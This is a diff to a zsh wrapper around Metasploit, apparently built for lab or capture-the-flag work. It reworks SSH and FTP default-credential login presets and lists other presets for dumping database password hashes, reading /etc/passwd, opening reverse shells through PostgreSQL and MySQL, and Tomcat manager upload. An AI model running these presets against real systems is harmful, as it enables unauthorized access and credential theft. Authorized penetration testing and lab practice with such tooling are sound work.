@@ -39,22 +39,26 @@ usage: msfr <preset> [options]
 
 Run Metasploit with case defaults: RHOSTS=$IP, RPORT from scout/env, LHOST=lhost (exploits).
 
+login presets (quick check — MSF defaults or seclists betterdefaultpasslist; wordlist → hydrassh / hydraftp):
+  pg-login       postgres (MSF built-in defaults) → cl
+  my-login       mysql (MSF root + blank) → cl
+  ssh-login      SSH (seclists ssh-betterdefaultpasslist) → cl
+  ftp-login      FTP (seclists ftp-betterdefaultpasslist) → cl
+
 presets (postgres):
-  pg-login       weak DB cred scan → saves hits to cl
+  pg-login       postgres quick login → saves hits to cl
   pg-sql         SQL query (-s, default SELECT version();)
   pg-readfile    read file (-f)
   pg-hashdump    dump DB password hashes
   pg-shell       COPY FROM PROGRAM revshell
 
 presets (mysql):
-  my-login       weak DB cred scan → saves hits to cl
+  my-login       mysql quick login → saves hits to cl
   my-sql         SQL query (-s, default SELECT version())
   my-hashdump    dump DB password hashes
   my-shell       UDF payload revshell
 
 presets (other):
-  ssh-login      SSH weak cred scan
-  ftp-login      FTP weak cred scan
   tomcat-mgr     tomcat_mgr_upload (Http creds; -U /manager)
 
 options:
@@ -76,16 +80,18 @@ options:
   --stay              keep msf open (default: exploits)
 
 env: MSFR_PORT, DB_PORT, MYSQL_PORT, SSH_PORT, FTP_PORT, HTTP_PORT, SMB_PORT
-      MSFR_USERLIST / MSFR_SSH_USERLIST, MSFR_PASSLIST (default: \$RECON_PASSLIST)
+      MSFR_QUICK_USERPASS / MSFR_SSH_USERPASS / MSFR_FTP_USERPASS (seclists betterdefaultpasslist)
 
 examples:
-  msfr pg-login
+  msfr pg-login                  # quick: blank / user-as-pass (not rockyou)
   msfr pg-sql -n
   msfr pg-sql darkstart          # cl のユーザを指定（-u でも可）
   msfr pg-readfile -u poster -f /etc/passwd
   msfr my-login
   msfr my-sql -u root
-  msfr ssh-login -u root
+  msfr ssh-login                 # quick; wordlist → hydrassh
+  msfr ssh-login -u root -w toor # single cred try
+  msfr ftp-login
   msfr tomcat-mgr -u bob -w bubbles -p 1234
   msfr -m exploit/multi/http/tomcat_mgr_upload -u bob -w bubbles -o TARGETURI=/manager --stay
 EOF
@@ -193,7 +199,7 @@ _msfr-rc-set() {
 }
 
 _msfr-preset-sets() {
-  local preset="$1" rc="$2" rfile="$3" sql="$4" targeturi="$5"
+  local preset="$1" rc="$2" rfile="$3" sql="$4" targeturi="$5" user="${6:-}" pass="${7:-}"
   case "$preset" in
     pg-login|postgres-login)
       _msfr-rc-set "$rc" STOP_ON_SUCCESS true
@@ -220,13 +226,17 @@ _msfr-preset-sets() {
       ;;
     ssh-login)
       _msfr-rc-set "$rc" STOP_ON_SUCCESS true
-      _msfr-rc-set "$rc" BLANK_PASSWORDS true
-      _msfr-rc-set "$rc" USER_AS_PASS true
-      _msfr-rc-set "$rc" ANONYMOUS_LOGIN true
+      if [[ -n "$user" && -z "$pass" ]]; then
+        _msfr-rc-set "$rc" BLANK_PASSWORDS true
+        _msfr-rc-set "$rc" USER_AS_PASS true
+      fi
       ;;
     ftp-login)
       _msfr-rc-set "$rc" STOP_ON_SUCCESS true
-      _msfr-rc-set "$rc" BLANK_PASSWORDS true
+      if [[ -n "$user" && -z "$pass" ]]; then
+        _msfr-rc-set "$rc" BLANK_PASSWORDS true
+        _msfr-rc-set "$rc" USER_AS_PASS true
+      fi
       ;;
     tomcat-mgr|tomcat-upload)
       _msfr-rc-set "$rc" TARGETURI "${targeturi:-/manager}"
@@ -244,22 +254,32 @@ _msfr-login-preset() {
 _msfr-login-scan-rc() {
   local preset="$1" rc="$2" user="$3" pass="$4"
   local line key val
+  local -a temps=()
 
   while IFS=$'\t' read -r key val; do
     [[ -n "$key" ]] || continue
+    if [[ "$key" == __TEMP__ ]]; then
+      temps+=("$val")
+      continue
+    fi
     _msfr-rc-set "$rc" "$key" "$val"
   done < <(_msfr-py "
 import msf_run, sys
 try:
-    sets = msf_run.login_scan_resource_sets(
+    result = msf_run.login_scan_resource_sets(
         sys.argv[1], user=sys.argv[2] or '', password=sys.argv[3] or ''
     )
 except msf_run.LoginScanConfigError as e:
     print(f'[-] msfr: {e}', file=sys.stderr)
     sys.exit(1)
-for k, v in sets:
+for tmp in result.temp_files:
+    print(f'__TEMP__\t{tmp}')
+for k, v in result.sets:
     print(f'{k}\t{v}')
 " "$preset" "$user" "$pass") || return 1
+
+  (( ${#temps[@]} )) && printf '%s\n' "${temps[@]}"
+  return 0
 }
 
 _msfr-creds-family() {
@@ -417,16 +437,17 @@ msfr() {
   fi
 
   local rc log msf_exit=0
+  local -a userpass_temps=()
   rc="$(mktemp "${TMPDIR:-/tmp}/msfr.XXXXXX.rc")"
   log="$(mktemp "${TMPDIR:-/tmp}/msfr.XXXXXX.log")"
-  trap 'rm -f "$rc" "$log"' EXIT INT TERM
+  trap 'rm -f "$rc" "$log" "${userpass_temps[@]}"' EXIT INT TERM
 
   print -r -- "use $module" >"$rc"
   _msfr-rc-set "$rc" RHOSTS "$rhost"
   [[ -n "$rport" ]] && _msfr-rc-set "$rc" RPORT "$rport"
 
   if [[ -n "$preset" ]]; then
-    _msfr-preset-sets "$preset" "$rc" "$rfile" "$sql" "${targeturi:-$default_uri}" || return 1
+    _msfr-preset-sets "$preset" "$rc" "$rfile" "$sql" "${targeturi:-$default_uri}" "$user" "$pass" || return 1
   elif [[ -n "$targeturi" ]]; then
     _msfr-rc-set "$rc" TARGETURI "$targeturi"
   fi
@@ -434,7 +455,7 @@ msfr() {
   if _msfr-login-preset "$preset"; then
     case "$preset" in
       ssh-login|ftp-login)
-        _msfr-login-scan-rc "$preset" "$rc" "$user" "$pass" || return 1
+        userpass_temps=("${(@f)$(_msfr-login-scan-rc "$preset" "$rc" "$user" "$pass")}") || return 1
         ;;
     esac
   fi
@@ -551,8 +572,8 @@ _msfr() {
     'my-sql:SQL query'
     'my-hashdump:Password hash dump'
     'my-shell:UDF payload shell'
-    'ssh-login:SSH login scan'
-    'ftp-login:FTP login scan'
+    'ssh-login:SSH quick login (blank/user-as-pass)'
+    'ftp-login:FTP quick login (anonymous etc.)'
     'tomcat-mgr:Tomcat manager upload'
     'list:List presets'
   )
